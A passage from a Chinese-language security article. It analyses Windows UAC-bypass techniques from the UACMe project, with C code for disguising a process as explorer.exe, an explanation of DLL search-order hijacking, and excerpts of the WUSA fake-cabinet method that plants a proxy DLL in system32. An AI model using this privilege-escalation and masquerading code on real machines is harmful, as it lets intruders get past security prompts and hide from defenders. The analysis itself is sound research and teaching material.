            DWORD dwTargetId = FindProcId(ProcessName);
            if (0 == dwTargetId) {
                printf("can not find procIdn");
                break;
            }
            if (FALSE == DisguiseProcess(dwTargetId, (wchar_t*)L"C:\\Windows\\explorer.exe", (wchar_t*)L"C:\\Windows\\Explorer.EXE"))
            {
                printf("Dsisguise Process Error.");
                break;
            }
            printf("Disguise Process OK.");
        } while (FALSE);
        system("pause");
        return 0;
    }
这里有几点需要注意的：
  1. 计算长度时，由于wcslen返回的是unicode的字符个数，每个unicode字符占两个字节，在加上结尾的两个空字节，所以是2+2*wcslen(lpwszCmd)
  2. NtQueryInformationProcess这个函数没有关联的导入库，必须使用LoadLibrary和GetProcessAddress函数从Ntdll.dll中获取该函数地址
Demo运行后，会将Calculator.exe的cmdline和imagepath修改为指定进程的，如果想将路径也伪装正确，可以调用GetModuleFileNameEx、GetProcessImageFileName或者QueryFullProcessImageName等函数获取伪装进程的正确路径
在UACME项目中，是由supMasqueradeProcess函数实现了该技术，原理是一样的，只不过该函数实现的是伪装自身的信息。
####  DLL劫持的几种方式
#####  DLL加载顺序劫持
DLL劫持中最常见的一种劫持方法，即在程序所在目录放置要劫持的DLL，程序启动时首先从本目录加载DLL，从而导致DLL劫持,DLL的加载顺序如下:
  * 1.程序所在目录
  * 2.程序加载目录（SetCurrentDirectory）
  * 3.系统目录即 SYSTEM32 目录
  * 4.16位系统目录即 SYSTEM 目录
  * 5.Windows目录
  * 6.PATH环境变量中列出的目录
PS：Windows操作系统通过“DLL路径搜索目录顺序”和“Know
DLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能
1号方法用的就是这种方法,以此为例分析一下,7号方法的信息如下:
> 7.Author: Win32/Carberp derivative
>
>   * Type: Dll Hijack
>   * Method: WUSA
>   * Target(s): \system32\cliconfg.exe
>   * Component(s): ntwdblib.dll
>   * Implementation: ucmWusaMethod
>   * Works from: Windows 7 (7600)
>   * Fixed in: Windows 10 TH1 (10147)
>     * How: WUSA /extract option removed
>
这里顺便以7号方法为例,分析一下UACMe的代码实现:
主程序:main.c,入口在ucmMain() 传入一个method号,其中method是个枚举类型_UCM_METHOD:
    typedef enum _UCM_METHOD {
        UacMethodTest = 0,          //+
        UacMethodSysprep1 = 1,      //+
        UacMethodSysprep2,          //+
        UacMethodOobe,              //+
        UacMethodRedirectExe,       //+
        UacMethodSimda,             //+
        UacMethodCarberp1,          //+
        UacMethodCarberp2,          //+
        UacMethodTilon,             //+
        UacMethodAVrf,              //+
        UacMethodWinsat,            //+
        UacMethodShimPatch,         //+
        UacMethodSysprep3,          //+
        UacMethodMMC1,              //+
        UacMethodSirefef,           //+
        UacMethodGeneric,           //+
        UacMethodGWX,               //+
        UacMethodSysprep4,          //+
        UacMethodManifest,          //+
        UacMethodInetMgr,           //+
        UacMethodMMC2,              //+
        UacMethodSXS,               //+
        UacMethodSXSConsent,        //+
        UacMethodDISM,              //+
        UacMethodComet,             //+
        UacMethodEnigma0x3,         //+
        UacMethodEnigma0x3_2,       //+
        UacMethodExpLife,           //+
        UacMethodSandworm,          //+
        UacMethodEnigma0x3_3,       //+
        UacMethodWow64Logger,       //+
        UacMethodEnigma0x3_4,       //+
        UacMethodUiAccess,          //+
        UacMethodMsSettings,        //+
        UacMethodTyranid,           //+
        UacMethodTokenMod,          //+
        UacMethodJunction,          //+
        UacMethodSXSDccw,           //+
        UacMethodHakril,            //+
        UacMethodCorProfiler,       //+
        UacMethodCOMHandlers,       //+
        UacMethodCMLuaUtil,         //+
        UacMethodFwCplLua,          //+
        UacMethodDccwCOM,           //+
        UacMethodVolatileEnv,       //+
        UacMethodSluiHijack,        //+
        UacMethodBitlockerRC,       //+
        UacMethodCOMHandlers2,      //+
        UacMethodSPPLUAObject,      //+
        UacMethodCreateNewLink,     //+
        UacMethodDateTimeWriter,    //+
        UacMethodAcCplAdmin,        //+
        UacMethodDirectoryMock,     //+
        UacMethodShellSdclt,        //+
        UacMethodEgre55,            //+
        UacMethodTokenModUiAccess,  //+
        UacMethodShellWSReset,      //+
        UacMethodSysprep5,          //+
        UacMethodEditionUpgradeMgr, //+
        UacMethodDebugObject,       //+
        UacMethodGlupteba,          //+
        UacMethodShellChangePk,     //+
        UacMethodMsSettings2,       //+
        UacMethodMax,
        UacMethodInvalid = 0xabcdef
    } UCM_METHOD;
这些是所有支持的BypassUAC的方式,对应着readme中列举出来的方法
接着就是一些初始化和检查,直接到MethodsManagerCall函数,该函数会在调用前做一些准备工作,包括如果需要额外的payload,会从资源文件中解密出来.MethodsManagerCall还会根据传入的Method号在ucmMethodsDispatchTable这个结构体找到调用方法
ucmMethodsDispatchTable是一个UCM_API_DISPATCH_ENTRY的结构体数组,跟着看这个结构体的定义
    // UCM_API_DISPATCH_ENTRY定义
    typedef struct _UCM_API_DISPATCH_ENTRY {
        PUCM_API_ROUTINE Routine;               //执行的方法
        PUCM_EXTRA_CONTEXT ExtraContext;        //该方法执行时依赖的额外内容
        UCM_METHOD_AVAILABILITY Availability;   //可行的最小/最大windows版本号
        ULONG PayloadResourceId;                //使用的payload dll
        BOOL Win32OrWow64Required;
        BOOL DisallowWow64;
        BOOL SetParameters;                     //是否需要shared参数被设置
    } UCM_API_DISPATCH_ENTRY, *PUCM_API_DISPATCH_ENTRY;
在解析完结构体后,根据配置,加载额外的内容或payload.之后获取其他命令行参数,这里需要重点关注Routine,这个结构体变量,该变量是一个PUCM_API_ROUTINE类型的变量,定义如下:
    typedef NTSTATUS(CALLBACK *PUCM_API_ROUTINE)(
        _In_ PUCM_PARAMS_BLOCK Parameter
        );
    //稍微扩展一下:
    typedef NTSTATUS(__stdcall *PUCM_API_ROUTINE)(
        _In_ PUCM_PARAMS_BLOCK Parameter
        );
即PUCM_API_ROUTINE是一个指向“接受一个PUCM_PARAMS_BLOCK类型作为参数并回传一个NTSTATUS类型值的函数”的指针别名,也就是说可以通过该函数指针去调用该函数.接着看PUCM_PARAMS_BLOCK:
    typedef struct tagUCM_PARAMS_BLOCK {
        UCM_METHOD Method;
        PVOID PayloadCode;
        ULONG PayloadSize;
    } UCM_PARAMS_BLOCK, *PUCM_PARAMS_BLOCK;
PUCM_PARAMS_BLOCK是一个tagUCM_PARAMS_BLOCK的结构体指针,追到这里就可以不用在追了,将关键代码抽出来看:
    Entry = &ucmMethodsDispatchTable[Method];
    ParamsBlock.Method = Method;
    ParamsBlock.PayloadCode = PayloadCode;
    ParamsBlock.PayloadSize = PayloadSize;
    MethodResult = Entry->Routine(&ParamsBlock);
Entry找到了结构体内对应method的入口,也就是`{ MethodCarberp, NULL, { 7600, 10147 }, FUBUKI_ID,
FALSE, TRUE, TRUE },`这一项,这里作出分析,`MethodResult =
Entry->Routine(&ParamsBlock);`这里其实等价于:``MethodResult =
MethodCarberp(&ParamsBlock)`,我们看MethodCarberp的定义:
    //#define UCM_API(n) NTSTATUS CALLBACK n(_In_ PUCM_PARAMS_BLOCK Parameter)  
    UCM_API(MethodCarberp)
    {
        //
        // Additional checking for UacMethodCarberp1. 
        // Target application 'migwiz' unavailable in Syswow64 after Windows 7.
        //
        if (Parameter->Method == UacMethodCarberp1) {
            if ((g_ctx->IsWow64) && (g_ctx->dwBuildNumber > 7601)) {
                ucmShowMessage(g_ctx->OutputToDebugger, WOW64STRING);
                return STATUS_UNKNOWN_REVISION;
            }
        }
        return ucmWusaMethod(
            Parameter->Method,
            Parameter->PayloadCode,
            Parameter->PayloadSize);
    }
可见最终调用了ucmWusaMethod这个函数,将关键代码摘出来分析下:
    /*
    * ucmWusaMethod
    *
    * Purpose:
    *
    * Build and install fake msu package then run target application.
    *
    * Fixed in Windows 10 TH1
    *
    */
    NTSTATUS ucmWusaMethod(
        _In_ UCM_METHOD Method,
        _In_ PVOID ProxyDll,
        _In_ DWORD ProxyDllSize
    )
    {
        NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
        WCHAR       szSourceDll[MAX_PATH * 2];
        WCHAR       szTargetProcess[MAX_PATH * 2];
        WCHAR       szTargetDirectory[MAX_PATH * 2];
        _strcpy(szTargetProcess, g_ctx->szSystemDirectory);
        _strcpy(szTargetDirectory, g_ctx->szSystemDirectory);
        _strcpy(szSourceDll, g_ctx->szTempDirectory);
        switch (Method) {
        //
        // Use cliconfg.exe as target.
        // szTargetDirectory is system32
        //
        case UacMethodCarberp2:
            _strcat(szSourceDll, NTWDBLIB_DLL);
            _strcat(szTargetProcess, CLICONFG_EXE);
            break;
        default:
            return STATUS_INVALID_PARAMETER;
        }
        if (!PathFileExists(szTargetProcess)) {
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
        //
        // Extract file to the protected directory
        // First, create cab with fake msu ext, second run fusion process.
        //
        if (ucmCreateCabinetForSingleFile(
            szSourceDll,
            ProxyDll,
            ProxyDllSize,
            NULL))
        {
            if (ucmWusaExtractPackage(szTargetDirectory)) {
                //run target process for dll hijacking
                if (supRunProcess(szTargetProcess, NULL))
                    MethodResult = STATUS_SUCCESS;
            }